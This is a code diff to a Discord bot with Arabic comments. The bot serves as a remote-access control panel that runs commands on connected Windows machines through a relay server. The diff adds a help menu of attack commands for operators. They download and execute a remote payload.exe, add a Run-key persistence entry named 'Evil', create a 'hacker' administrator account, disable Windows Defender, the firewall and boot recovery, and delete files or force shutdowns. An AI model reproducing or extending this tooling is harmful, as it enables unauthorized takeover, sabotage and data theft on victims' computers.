@@ -88,7 +88,6 @@ client.on('messageCreate', async (msg) => {
     const args = msg.content.slice(PREFIX.length).trim().split(/ +/);
     const cmd = args.shift().toLowerCase();
 
-    // الاتصال الداخلي بالخادم الوسيط (نفس الحاوية)
     const baseUrl = `http://127.0.0.1:${PORT}`;
 
     // عرض الأجهزة المتصلة
@@ -170,14 +169,56 @@ client.on('messageCreate', async (msg) => {
         return;
     }
 
+    // === الأمر الجديد لعرض قائمة الأوامر القابلة للتنفيذ ===
+    if (cmd === 'exec-commands' || cmd === 'exec-help') {
+        const commandsList = `
+**📋 قائمة الأوامر التي يمكن تنفيذها عبر !exec:**
+
+\`whoami\` – عرض اسم المستخدم الحالي
+\`hostname\` – عرض اسم الجهاز
+\`systeminfo\` – معلومات النظام الكاملة
+\`tasklist\` – قائمة العمليات الجارية
+\`dir C:\\\` – عرض محتويات القرص C
+\`del /f /q "C:\\path\\file.txt"\` – حذف ملف بدون تأكيد
+\`rmdir /s /q "C:\\folder"\` – حذف مجلد بالكامل
+\`shutdown /r /t 0\` – إعادة تشغيل فورية
+\`shutdown /s /t 0\` – إيقاف تشغيل فوري
+\`shutdown /l\` – تسجيل خروج المستخدم
+\`taskkill /f /im explorer.exe\` – إنهاء مستكشف الملفات
+\`taskkill /f /im chrome.exe\` – إغلاق كل نوافذ كروم
+\`start notepad.exe\` – فتح المفكرة
+\`start calc.exe\` – فتح الآلة الحاسبة
+\`powershell -Command "Invoke-WebRequest -Uri 'http://...' -OutFile '%TEMP%\\payload.exe'; Start-Process '%TEMP%\\payload.exe'"\` – تحميل وتشغيل ملف خارجي
+\`reg add "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" /v Evil /t REG_SZ /d "C:\\Windows\\System32\\calc.exe" /f\` – إضافة برنامج للتشغيل التلقائي
+\`net user hacker Password123 /add\` – إضافة مستخدم جديد (يحتاج أدمن)
+\`net localgroup administrators hacker /add\` – إضافة المستخدم إلى مجموعة المديرين
+\`sc stop "WinDefend"\` – إيقاف Windows Defender
+\`sc config "WinDefend" start= disabled\` – تعطيل Windows Defender عند البدء
+\`bcdedit /set {default} recoveryenabled No\` – تعطيل خيارات الاسترداد
+\`bcdedit /set {default} bootstatuspolicy ignoreallfailures\` – تجاهل أخطاء الإقلاع
+\`wmic useraccount where "name='%username%'" set PasswordExpires=false\` – منع انتهاء كلمة المرور
+\`netsh advfirewall set allprofiles state off\` – تعطيل جدار الحماية (يحتاج أدمن)
+\`powershell -Command "Get-ChildItem -Path C:\\ -Recurse -ErrorAction SilentlyContinue | Out-File '%TEMP%\\filelist.txt'"\` – سرد كل الملفات وحفظها
+\`powershell -Command "Get-WmiObject Win32_BIOS | Format-List"\` – معلومات BIOS
+\`powershell -Command "Get-WmiObject Win32_Processor | Format-List"\` – معلومات المعالج
+\`powershell -Command "Get-WmiObject Win32_LogicalDisk | Format-List"\` – معلومات الأقراص
+
+**ملاحظة:** بعض الأوامر تحتاج صلاحيات مدير (Administrator) لتعمل.
+استخدم الأمر بالشكل: \`!exec <الأمر>\`
+مثال: \`!exec whoami\`
+        `;
+        await msg.reply(commandsList);
+        return;
+    }
+
     // أوامر مساعدة
     if (cmd === 'ping') return msg.reply(`Pong! ${client.ws.ping}ms`);
     if (cmd === 'help') {
-        return msg.reply(`📋 **الأوامر المتاحة:**\n\`!list\` – عرض الأجهزة\n\`!use <id>\` – اختيار جهاز\n\`!exec <أمر>\` – تنفيذ أمر\n\`!result <id>\` – جلب نتيجة سابقة\n\`!ping\` – اختبار الاتصال`);
+        return msg.reply(`📋 **الأوامر المتاحة:**\n\`!list\` – عرض الأجهزة\n\`!use <id>\` – اختيار جهاز\n\`!exec <أمر>\` – تنفيذ أمر\n\`!result <id>\` – جلب نتيجة سابقة\n\`!exec-commands\` – عرض قائمة الأوامر القابلة للتنفيذ\n\`!ping\` – اختبار الاتصال`);
     }
 });
 
-// حدث جاهزية البوت (استخدم clientReady لتجنب تحذير الإهمال)
+// حدث جاهزية البوت
 client.once('clientReady', () => {
     console.log(`✅ البوت يعمل باسم ${client.user.tag}`);
 });
@@ -191,10 +232,10 @@ client.login(TOKEN).catch(err => {
 // تشغيل خادم Express
 const server = app.listen(PORT, '0.0.0.0', () => {
     console.log(`✅ الخادم الوسيط يعمل على المنفذ ${PORT}`);
-    console.log(`🌐 الرابط العام: https://remote-production-b44f.up.railway.app`); // غيّر هذا حسب رابطك
+    console.log(`🌐 الرابط العام: https://remote-production-b44f.up.railway.app`); // غيّر حسب رابطك
 });
 
-// معالجة الأخطاء غير المتوقعة لمنع إيقاف الحاوية
+// معالجة الأخطاء غير المتوقعة
 process.on('uncaughtException', (err) => {
     console.error('⚠️ استثناء غير معالج:', err);
 });
